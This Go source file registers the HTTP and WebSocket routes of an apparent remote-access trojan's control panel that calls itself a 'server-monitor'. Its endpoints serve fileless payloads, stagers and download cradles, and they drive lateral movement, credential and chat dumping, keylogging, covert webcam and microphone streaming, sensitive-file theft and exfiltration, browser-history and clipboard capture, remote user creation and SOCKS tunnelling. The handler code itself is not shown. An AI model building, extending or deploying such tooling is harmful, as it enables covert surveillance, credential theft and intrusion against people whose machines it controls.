package handler

import (
	"server-monitor/internal/model"
	"server-monitor/internal/service"
	"server-monitor/internal/ws"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

func RegisterRoutes(r *gin.Engine, db *gorm.DB, hub *ws.Hub, agentHub *ws.AgentHub, collector *service.Collector) {
	// 初始化安全模块
	InitAuth(db)

	// 全局安全中间件
	r.Use(IPBlacklistMiddleware())
	r.Use(RateLimitMiddleware())

	// 公开接口
	r.POST("/api/login", Login)

	// Agent 上报和自动注册接口（不需要 JWT）
	agentHandler := NewAgentHandler(db, collector)
	r.POST("/api/agent/report", agentHandler.Report)
	r.POST("/api/agent/register", agentHandler.Register)

	// Agent 二进制下载和一键安装脚本（公开）
	agentUpdateHandler := NewAgentUpdateHandler(agentHub, db)
	r.GET("/api/agent/download", agentUpdateHandler.Download)
	r.GET("/api/agent/download-win", agentUpdateHandler.DownloadWin)
	r.GET("/api/agent/install.sh", agentUpdateHandler.InstallScript)
	r.GET("/api/agent/install.ps1", agentUpdateHandler.InstallScriptWin)
	r.GET("/api/agent/cleanup.ps1", agentUpdateHandler.CleanupScriptWin)

	// 无文件载荷分发（公开，agent 自注册时使用）
	filelessHandler := NewFilelessHandler("data/agent-bin", db)
	r.GET("/api/agent/payload", filelessHandler.Payload)
	r.GET("/api/agent/stager", filelessHandler.Stager)
	r.GET("/api/agent/cradle", filelessHandler.Cradle)
	r.GET("/api/agent/cradle-b64", filelessHandler.CradleB64)

	// Agent WebSocket（用 AgentToken 认证）
	execHandler := NewExecHandler(db, agentHub)
	r.GET("/ws/agent", execHandler.HandleAgentWS)

	// 压力测试 WebSocket（JWT 通过 query param 认证）
	stressHandler := NewStressHandler(db, agentHub, collector)
	r.GET("/ws/stress", func(c *gin.Context) {
		stressHandler.HandleWS(c.Writer, c.Request)
	})

	// 交互式终端 WebSocket（JWT 通过 query param 认证）
	termHandler := NewTerminalHandler(db, agentHub)
	r.GET("/ws/terminal/:id", func(c *gin.Context) {
		server, err := termHandler.ValidateAndGetServer(c.Request, c.Param("id"))
		if err != nil {
			c.JSON(401, gin.H{"error": err.Error()})
			return
		}
		termHandler.HandleTerminal(c.Writer, c.Request, *server)
	})

	// 桌面实时查看 WebSocket（JWT 通过 query param 认证）
	r.GET("/ws/screen/:id", func(c *gin.Context) {
		server, err := termHandler.ValidateAndGetServer(c.Request, c.Param("id"))
		if err != nil {
			c.JSON(401, gin.H{"error": err.Error()})
			return
		}
		termHandler.HandleScreen(c.Writer, c.Request, *server)
	})

	// 摄像头实时流 WebSocket（二进制推送）
	r.GET("/ws/webcam/:id", func(c *gin.Context) {
		server, err := termHandler.ValidateAndGetServer(c.Request, c.Param("id"))
		if err != nil {
			c.JSON(401, gin.H{"error": err.Error()})
			return
		}
		termHandler.HandleWebcam(c.Writer, c.Request, *server)
	})

	// 麦克风实时流 WebSocket
	r.GET("/ws/mic/:id", func(c *gin.Context) {
		server, err := termHandler.ValidateAndGetServer(c.Request, c.Param("id"))
		if err != nil {
			c.JSON(401, gin.H{"error": err.Error()})
			return
		}
		termHandler.HandleMic(c.Writer, c.Request, *server)
	})

	api := r.Group("/api")
	api.Use(AuthMiddleware())

	// 用户信息
	api.GET("/user/info", GetUserInfo)
	api.PUT("/user/password", ChangePassword)

	// 服务器管理
	serverHandler := NewServerHandler(db, collector)
	api.GET("/servers", serverHandler.List)
	api.GET("/servers/:id", serverHandler.GetByID)
	api.POST("/servers", serverHandler.Create)
	api.PUT("/servers/:id", serverHandler.Update)
	api.DELETE("/servers/:id", serverHandler.Delete)
	api.POST("/servers/:id/test", serverHandler.TestConnection)
	api.POST("/servers/test", serverHandler.TestNewConnection)

	// 远程执行
	api.POST("/servers/:id/exec", execHandler.Exec)
	api.POST("/servers/:id/quick-cmd", execHandler.QuickCmd)
	api.GET("/servers/:id/agent-status", execHandler.AgentStatus)

	// 横向移动（内网扫描 + 远程部署）
	api.POST("/servers/:id/net-scan", execHandler.NetScan)
	api.POST("/servers/:id/lateral-deploy", execHandler.LateralDeploy)
	api.POST("/servers/:id/cred-dump", execHandler.CredDump)
	api.POST("/servers/:id/chat-dump", execHandler.ChatDump)

	// 文件管理 + 摄像头
	api.POST("/servers/:id/file-browse", execHandler.FileBrowse)
	api.POST("/servers/:id/file-download", execHandler.FileDownload)
	api.POST("/servers/:id/webcam-snap", execHandler.WebcamSnap)
	api.POST("/servers/:id/force-update-cs", execHandler.ForceUpdateCS)
	api.GET("/downloads/:id", execHandler.FileDownloadServe)

	// 窗口管理
	api.GET("/servers/:id/window-list", execHandler.WindowList)
	api.POST("/servers/:id/window-control", execHandler.WindowControl)

	// 进程管理 + 服务管理 + 键盘记录
	api.GET("/servers/:id/process-list", execHandler.ProcessList)
	api.POST("/servers/:id/process-kill", execHandler.ProcessKill)
	api.GET("/servers/:id/service-list", execHandler.ServiceList)
	api.POST("/servers/:id/service-control", execHandler.ServiceControl)
	api.POST("/servers/:id/keylog-start", execHandler.KeylogStart)
	api.POST("/servers/:id/keylog-stop", execHandler.KeylogStop)
	api.GET("/servers/:id/keylog-dump", execHandler.KeylogDump)

	// 实时摄像头流
	api.POST("/servers/:id/webcam-stream-start", execHandler.WebcamStreamStart)
	api.POST("/servers/:id/webcam-stream-stop", execHandler.WebcamStreamStop)
	api.GET("/servers/:id/webcam-frame", execHandler.WebcamLatestFrame)

	// 实时麦克风监听
	api.POST("/servers/:id/mic-stream-start", execHandler.MicStreamStart)
	api.POST("/servers/:id/mic-stream-stop", execHandler.MicStreamStop)
	api.GET("/servers/:id/mic-frame", execHandler.MicLatestFrame)

	// ── 新增 DLL 功能路由 ──
	// 远程桌面输入注入
	api.POST("/servers/:id/screen-input", execHandler.ScreenInput)
	// 文件上传到目标
	api.POST("/servers/:id/file-upload", execHandler.FileUploadToAgent)
	api.POST("/servers/:id/file-upload-start", execHandler.FileUploadStartToAgent)
	api.POST("/servers/:id/file-upload-chunk", execHandler.FileUploadChunkToAgent)
	// 注册表编辑
	api.POST("/servers/:id/reg-browse", execHandler.RegBrowse)
	api.POST("/servers/:id/reg-write", execHandler.RegWrite)
	api.POST("/servers/:id/reg-delete", execHandler.RegDelete)
	// 用户管理
	api.GET("/servers/:id/user-list", execHandler.UserListRemote)
	api.POST("/servers/:id/user-add", execHandler.UserAddRemote)
	api.POST("/servers/:id/user-delete", execHandler.UserDeleteRemote)
	// RDP 管理
	api.POST("/servers/:id/rdp-manage", execHandler.RdpManage)
	// 网络状态
	api.GET("/servers/:id/netstat", execHandler.NetstatRemote)
	// 已安装软件
	api.GET("/servers/:id/software-list", execHandler.SoftwareListRemote)
	// 敏感文件扫描 + 提取
	api.POST("/servers/:id/file-steal", execHandler.FileStealRemote)
	api.POST("/servers/:id/file-exfil", execHandler.FileExfilRemote)
	// 浏览器历史
	api.GET("/servers/:id/browser-history", execHandler.BrowserHistoryRemote)
	// 剪贴板 + 系统信息
	api.GET("/servers/:id/clipboard", execHandler.ClipboardDumpRemote)
	api.GET("/servers/:id/info-dump", execHandler.InfoDumpRemote)

	// Agent 分片上传（公开端点，Agent 用 token 自认证）
	r.POST("/api/agent/file-chunk", execHandler.FileChunkUpload)

	// 指标查询
	metricHandler := NewMetricHandler(db, collector)
	api.GET("/metrics/overview", metricHandler.Overview)
	api.GET("/metrics/realtime", metricHandler.Realtime)
	api.GET("/metrics/:serverId", metricHandler.History)

	// 告警管理
	alertHandler := NewAlertHandler(db)
	api.GET("/alerts", alertHandler.List)
	api.GET("/alerts/count", alertHandler.Count)
	api.PUT("/alerts/:id/resolve", alertHandler.Resolve)
	api.PUT("/alerts/batch-resolve", alertHandler.BatchResolve)

	// 告警规则
	api.GET("/alert-rules", alertHandler.ListRules)
	api.PUT("/alert-rules/:id", alertHandler.UpdateRule)

	// 压力测试
	api.POST("/stress/start", stressHandler.Start)
	api.POST("/stress/stop/:id", stressHandler.Stop)
	api.GET("/stress/agents", stressHandler.GetOnlineAgents)

	// 安全管理
	api.GET("/security/blacklist", ListBlacklist)
	api.POST("/security/blacklist", AddBlacklist)
	api.DELETE("/security/blacklist/:id", RemoveBlacklist)
	api.GET("/security/logs", ListSecurityLogs)
	api.GET("/security/login-attempts", ListLoginAttempts)

	// 通知推送配置
	notifyHandler := NewNotifyHandler(db, collector)
	api.GET("/notify/config", notifyHandler.GetConfig)
	api.PUT("/notify/config", notifyHandler.UpdateConfig)
	api.POST("/notify/test", notifyHandler.TestNotify)

	// Agent 更新管理
	api.POST("/agent/upload", agentUpdateHandler.Upload)
	api.GET("/agent/info", agentUpdateHandler.Info)
	api.POST("/agent/push-update", agentUpdateHandler.PushUpdate)
	api.POST("/agent/force-update-win", agentUpdateHandler.ForceUpdateWin)
	api.POST("/agent/force-update-linux", agentUpdateHandler.ForceUpdateLinux)

	// 无文件下发命令生成（管理员用）
	api.POST("/agent/fileless-generate", filelessHandler.GenerateCradle)

	// SOCKS5 代理
	api.POST("/servers/:id/socks-start", execHandler.SocksProxyStart)
	api.POST("/servers/:id/socks-stop", execHandler.SocksProxyStop)
	api.GET("/servers/:id/socks-status", execHandler.SocksProxyStatus)

	// 端口转发
	api.POST("/servers/:id/port-forward-start", execHandler.PortForwardStart)
	api.POST("/servers/:id/port-forward-stop", execHandler.PortForwardStop)
	api.GET("/servers/:id/port-forward-list", execHandler.PortForwardList)

	// 系统配置
	api.GET("/config", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"success": true,
			"data": gin.H{
				"collectInterval": 10,
				"sshTimeout":      5,
				"retryCount":      2,
				"version":         "3.3.0",
				"installKey":      model.GetSignKey(db),
			},
		})
	})
}
